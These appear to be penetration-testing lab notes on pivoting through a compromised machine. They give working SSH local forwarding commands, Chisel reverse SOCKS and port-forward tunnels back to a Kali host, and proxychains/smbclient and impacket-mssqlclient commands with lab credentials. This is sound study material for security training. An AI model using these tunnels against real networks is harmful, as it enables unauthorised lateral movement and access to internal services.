## Local port forwarding
- What it does: 
	- 1 listening port (on initial machine) to 1 port (behind network)
### SSH local port forwarding
- `ssh -N -L 0.0.0.0:[port to open on initial machine]:[ip of target machine behind network]:[target port] database_admin@[initial machine ip]`
	- E.g. `ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215`

## Dynamic port forwarding
- What it does:
	- 1 listening port (on initial machine) to anywhere (behind network)

## Dynamic port forwarding with Chisel
1. Download `chisel64.exe` on initial machine
2. Start chisel executable on Kali:
	`chisel64.elf server -p 8000 --reverse`
3. Connect to it from initial machine:
	`chisel64.exe client 192.168.45.127:8000 R:socks`
4. Edit `/etc/proxychains4.conf` to add the line:
	`socks5 127.0.0.1:1080`
5. Done!
	`proxychains [normal command as if you were issuing it from the initial machine]`
	E.g. `proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234`

## Local port forwarding with Chisel
1. Download `chisel64.exe` on initial machine
2.  Start chisel executable on Kali:
	`chisel64.elf server -p 8000 --reverse`
3. Connect to it from initial machine:
	`cmd /c chisel.exe client <kaliIP:port> R:<kali port to forward to>:127.0.0.1:<local port to forward>`
	E.g. `chisel.exe client $KaliIP:445 R:1433:127.0.0.1:1433`
4. Run your command from Kali:
	`impacket-mssqlclient svc_mssql:'Service1'@127.0.0.1 -windows-auth`